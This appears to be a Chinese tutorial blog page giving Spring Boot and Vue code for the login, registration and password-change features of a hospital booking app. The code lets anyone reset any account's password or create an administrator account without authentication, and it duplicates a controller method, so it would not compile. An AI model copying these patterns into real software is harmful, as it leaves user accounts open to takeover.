class="hljs-keyword">public</span> User <span class="hljs-title function_">checkRegister</span><span class="hljs-params">(String id)</span>;<span class="hljs-comment">//判断id是否已经存在</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//添加用户（注册）</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkLogin</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//判断手机号、密码和flag是否正确</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(String id,String password)</span>;<span class="hljs-comment">//修改密码（用户）</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">current</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取当前的登录信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span>;<span class="hljs-comment">//登出</span><br>&#125;<br></code></pre></td></tr></table></figure><p>UserServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.service.impl;<br><br><span class="hljs-keyword">import</span> com.xbb.dao.UserMapper;<br><span class="hljs-keyword">import</span> com.xbb.entity.User;<br><span class="hljs-keyword">import</span> com.xbb.service.UserService;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper userMapper;<br>    <span class="hljs-meta">@Autowired</span><br>    HttpServletRequest httpServletRequest;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkRegister</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.checkRegister(id);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.addUser(user);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkLogin</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> userMapper.checkLogin(user);<br>        <span class="hljs-keyword">if</span> (res != <span class="hljs-literal">null</span>) httpServletRequest.getSession().setAttribute(<span class="hljs-string">&quot;id&quot;</span>, res.getId());<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(String id,String password)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.updateUser(id,password);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">current</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (String) httpServletRequest.getSession().getAttribute(<span class="hljs-string">&quot;id&quot;</span>);<br>        <span class="hljs-keyword">return</span> userMapper.getById(id);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span> &#123;<br>        httpServletRequest.getSession().removeAttribute(<span class="hljs-string">&quot;id&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>controller&#x2F;UserController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.controller;<br><br><span class="hljs-keyword">import</span> com.xbb.entity.User;<br><span class="hljs-keyword">import</span> com.xbb.service.impl.UserServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(value = &quot;/user&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/checkRegister&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkRegister</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String id)</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.checkRegister(id);<br>    &#125;<br>    <br>    <span class="hljs-meta">@RequestMapping(value= &quot;/addUser&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.addUser(user);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/checkLogin&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkLogin</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.checkLogin(user);<br>    &#125;<br>    <br>    <span class="hljs-meta">@RequestMapping(value = &quot;/updateUser&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String id,<span class="hljs-meta">@RequestParam</span> String password)</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.updateUser(id,password);<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/current&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">current</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.current();<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/logout&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span>&#123;<br>        userService.logout();<br>    &#125;<br>    <br>    <span class="hljs-meta">@GetMapping(&quot;/current&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">current</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> userService.current();<br>    &#125;<br>    <br>    <span class="hljs-meta">@RequestMapping(value = &quot;/addDNUser&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addDNUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String id,<span class="hljs-meta">@RequestParam</span> String password,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestParam</span> String username,<span class="hljs-meta">@RequestParam</span> <span class="hljs-type">int</span> flag)</span>&#123;<br>        User user=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setId(id);<br>        user.setPassword(password);<br>        user.setUsername(username);<br>        user.setFlag(flag);<br>        <span class="hljs-keyword">return</span> userService.addUser(user);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;前端&#x3D;&#x3D;</p><p>views下新建login文件夹，login文件夹下新建Login.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-form ref=&quot;loginForm&quot; :model=&quot;form&quot; :rules=&quot;rules&quot;<br>             label-width=&quot;80px&quot; class=&quot;login-box&quot;&gt;<br>      &lt;h3 class=&quot;title&quot;&gt;小宝贝看病病&lt;/h3&gt;<br>      &lt;h3 class=&quot;login-title&quot;&gt;欢迎登录&lt;/h3&gt;<br><br>      &lt;el-form-item label=&quot;账号&quot; prop=&quot;id&quot;&gt;<br>        &lt;el-input type=&quot;text&quot; placeholder=&quot;请输入账号&quot; v-model=&quot;form.id&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot;&gt;<br>         <br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请输入密码&quot; v-model=&quot;form.password&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-radio-group v-model=&quot;form.flag&quot;&gt;<br>        &lt;el-radio :label=&quot;0&quot;&gt;用户&lt;/el-radio&gt;<br>        &lt;el-radio :label=&quot;1&quot;&gt;医生&lt;/el-radio&gt;<br>        &lt;el-radio :label=&quot;2&quot;&gt;护士&lt;/el-radio&gt;<br>        &lt;el-radio :label=&quot;3&quot;&gt;管理员&lt;/el-radio&gt;<br>      &lt;/el-radio-group&gt;<br><br>      &lt;el-form-item class=&quot;buttons&quot; style=&quot;margin-left: -60px&quot;&gt;<br>        &lt;el-button @click=&quot;toRegister()&quot;&gt;跳转注册页&lt;/el-button&gt;<br>        &lt;el-button @click=&quot;toUpdatePassword()&quot;&gt;修改密码&lt;/el-button&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit(&#x27;loginForm&#x27;)&quot;&gt;登录&lt;/el-button&gt;<br>      &lt;/el-form-item&gt;<br><br>    &lt;/el-form&gt;<br><br>    &lt;el-dialog<br>      title=&quot;温馨提示&quot;<br>      :visible.sync=&quot;dialogVisible&quot;<br>      width=&quot;30%&quot;&gt;<br>&lt;!--      :before-close=&quot;handleClose&quot;--&gt;<br>      &lt;span&gt;请输入正确的格式&lt;/span&gt;<br>      &lt;span slot=&quot;footer&quot; class=&quot;dialog-footer&quot;&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;dialogVisible = false&quot;&gt;确定&lt;/el-button&gt;<br>      &lt;/span&gt;<br>    &lt;/el-dialog&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;login&#125; from &#x27;@/api/login&#x27;<br>export default &#123;<br>  name: &#x27;Login.vue&#x27;,<br>  data () &#123;<br>    return &#123;<br>      form: &#123;<br>        id: &#x27;&#x27;,<br>        password: &#x27;&#x27;,<br>        flag: &#x27;&#x27;<br>      &#125;,<br>      // 表单验证，需要在el-form-item元素中增加prop属性<br>      rules: &#123;<br>        id: [<br>          &#123;required: true, message: &#x27;账号不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        password: [<br>          &#123;required: true, message: &#x27;密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        flag: [<br>          &#123;required: true, message: &#x27;密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ]<br>      &#125;,<br>      // 对话框和显示<br>      dialogVisible: false<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    toUpdatePassword() &#123;<br>      this.$router.push(&#x27;/updatepassword&#x27;)<br>    &#125;,<br>    showPwd () &#123;<br>      if (this.passwordType === &#x27;password&#x27;) &#123;<br>        this.passwordType = &#x27;&#x27;<br>      &#125; else &#123;<br>        this.passwordType = &#x27;password&#x27;<br>      &#125;<br>      this.$nextTick(() =&gt; &#123;<br>        this.$refs.password.focus()<br>      &#125;)<br>    &#125;,<br>    onSubmit (formName) &#123;<br>      // 为表单绑定验证功能<br>      this.$refs[formName].validate((vaild) =&gt; &#123;<br>        if (vaild) &#123;<br>          login(this.form).then((res) =&gt; &#123;<br>            console.log(res)<br>            if (res.id !== undefined) &#123;<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;登录成功&#x27;,<br>                type: &#x27;success&#x27;<br>              &#125;)<br>              // 使用vue-router路由到指定页面，该方式成为编程式导航<br>              if (res.flag === 0)&#123;<br>                this.$router.push(&#x27;/patient&#x27;)<br>              &#125;else if(res.flag === 1)&#123;<br>                this.$router.push(&#x27;/doctor&#x27;)<br>              &#125;else if(res.flag === 2)&#123;<br>                this.$router.push(&#x27;/nurse&#x27;)<br>              &#125;else &#123;<br>                this.$router.push(&#x27;admin&#x27;)<br>              &#125;<br>            &#125; else &#123;<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;账号或密码错误&#x27;,<br>                type: &#x27;error&#x27;<br>              &#125;)<br>            &#125;<br>          &#125;)<br>          // // 使用vue-router路由到指定页面，该方式成为编程式导航<br>          // this.$router.push(&#x27;/main&#x27;)<br>        &#125; else &#123;<br>          this.dialogVisible = true<br>          return false<br>        &#125;<br>      &#125;)<br>    &#125;,<br>    toRegister () &#123;<br>      this.$router.push(&#x27;/register&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style lang=&quot;scss&quot; scoped&gt;<br>.title &#123;<br>  margin: 0 auto 30px auto;<br>  text-align: center;<br>  color: #707070;<br>&#125;<br><br>.login-box &#123;<br>  border: 1px green solid;<br>  width: 350px;<br>  margin: 80px auto;<br>  padding: 35px 35px 15px 35px;<br>  border-radius: 5px;<br>  -webkit-border-radius: 5px;<br>  -moz-border-radius: 5px;<br>  box-shadow: 0 0 25px #2c3e90;<br>&#125;<br><br>.login-title &#123;<br>  text-align: center;<br>  margin: 0 auto 40px auto;<br>  color: #af4f7e;<br>&#125;<br><br>.buttons &#123;<br>  //margin: 30px auto;<br>  margin-top: 40px;<br>  margin-left: 25px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>login下新建Register.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-form ref=&quot;registerForm&quot; :model=&quot;form&quot; :rules=&quot;rules&quot;<br>             label-width=&quot;80px&quot; class=&quot;register-box&quot;&gt;<br>      &lt;h3 class=&quot;title&quot;&gt;小宝贝看病病&lt;/h3&gt;<br>      &lt;h3 class=&quot;register-title&quot;&gt;欢迎注册&lt;/h3&gt;<br><br>      &lt;el-form-item label=&quot;用户名&quot; prop=&quot;username&quot;&gt;<br>        &lt;el-input type=&quot;text&quot; placeholder=&quot;请输入用户名&quot; v-model=&quot;form.username&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item label=&quot;手机号&quot; prop=&quot;id&quot;&gt;<br>        &lt;el-input type=&quot;text&quot; placeholder=&quot;请输入手机号&quot; v-model=&quot;form.id&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请输入密码&quot; v-model=&quot;form.password&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item label=&quot;确认密码&quot; prop=&quot;confirmPassword&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请输入密码&quot; v-model=&quot;form.confirmPassword&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item class=&quot;register-button&quot; style=&quot;margin-left: 0px&quot;&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit(&#x27;registerForm&#x27;)&quot;&gt;注册&lt;/el-button&gt;<br>        &lt;el-button @click=&quot;toLogin()&quot;&gt;跳转登录页&lt;/el-button&gt;<br>      &lt;/el-form-item&gt;<br><br>    &lt;/el-form&gt;<br><br>    &lt;el-dialog<br>      title=&quot;温馨提示&quot;<br>      :visible.sync=&quot;dialogVisible&quot;<br>      width=&quot;30%&quot;<br>      &gt;<br>      &lt;span&gt;请重新验证格式&lt;/span&gt;<br>      &lt;span slot=&quot;footer&quot; class=&quot;dialog-footer&quot;&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;dialogVisible = false&quot;&gt;重新输入&lt;/el-button&gt;<br>&lt;!--        &lt;el-button type=&quot;primary&quot; @click=&quot;toLogin()&quot;&gt;回到登录&lt;/el-button&gt;--&gt;<br>      &lt;/span&gt;<br>    &lt;/el-dialog&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;register, checkRegister&#125; from &#x27;@/api/register&#x27;<br>import &#123;<br>  validateContacts,<br>  validatePhone,<br>  validatePsdReg<br>&#125; from &#x27;@/views/login/validation&#x27;<br>import &#123;addPatient&#125; from &#x27;@/api/admin&#x27;<br>export default &#123;<br>  name: &#x27;Register&#x27;,<br>  data () &#123;<br>    return &#123;<br>      form: &#123;<br>        username: &#x27;&#x27;,<br>        id: &#x27;&#x27;,<br>        password: &#x27;&#x27;,<br>        confirmPassword: &#x27;&#x27;,<br>        // flag: &#x27;&#x27;<br>      &#125;,<br>      patientForm: &#123;<br>        telephone: &#x27;&#x27;<br>      &#125;,<br>      // 表单验证，需要在el-form-item元素中增加prop属性<br>      rules: &#123;<br>        username: [<br>          &#123;required: true, message: &#x27;用户名不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123; validator: validateContacts, message: validateContacts.callback, trigger: &#x27;blur&#x27; &#125;<br>        ],<br>        id: [<br>          &#123;required: true, message: &#x27;手机号不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123; min: 11, max: 11, message: &#x27;手机号格式错误&#x27;, trigger: &#x27;blur&#x27; &#125;,<br>          &#123; validator: validatePhone, message: &#x27;手机号格式错误&#x27;, trigger: &#x27;blur&#x27; &#125;<br>        ],<br>        password: [<br>          &#123;required: true, message: &#x27;密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123;validator:validatePsdReg, message: validatePsdReg.callback, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        confirmPassword: [<br>          &#123;required: true, message: &#x27;密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123;<br>            validator:(rule,value,callback)=&gt;&#123;<br>              if(value===&#x27;&#x27;)&#123;<br>                callback(new Error(&#x27;请再次输入密码&#x27;))<br>              &#125;else if(value!==this.form.password)&#123;<br>                callback(new Error(&#x27;两次输入密码不一致&#x27;))<br>              &#125;else&#123;<br>                callback( )<br>              &#125;<br>            &#125;,<br>            trigger:&#x27;blur&#x27;<br>          &#125;<br>        ]<br>      &#125;,<br>      // 对话框和显示<br>      dialogVisible: false<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    toLogin() &#123;<br>      this.dialogVisible = false<br>      this.$router.push(&#x27;/login&#x27;)<br>    &#125;,<br>    onSubmit (formName) &#123;<br>      // 为表单绑定验证功能<br>      this.$refs[formName].validate((vaild) =&gt; &#123;<br>        console.log(this.form.id)<br>        checkRegister(this.form.id).then((res) =&gt; &#123;<br>          console.log(res.id)<br>          if (vaild) &#123;<br>            if (res.id === undefined) &#123;<br>              // 使用vue-router路由到指定页面，该方式成为编程式导航<br>              register(this.form).then((res) =&gt; &#123;<br>                console.log(res)<br>              &#125;)<br>              this.patientForm.telephone = this.form.id<br>              addPatient(this.patientForm)<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;注册成功&#x27;,<br>                type: &#x27;success&#x27;<br>              &#125;)<br>              this.$router.push(&#x27;/login&#x27;)<br>              return true<br>            &#125; else &#123;<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;该手机号已注册&#x27;,<br>                type: &#x27;error&#x27;<br>              &#125;)<br>            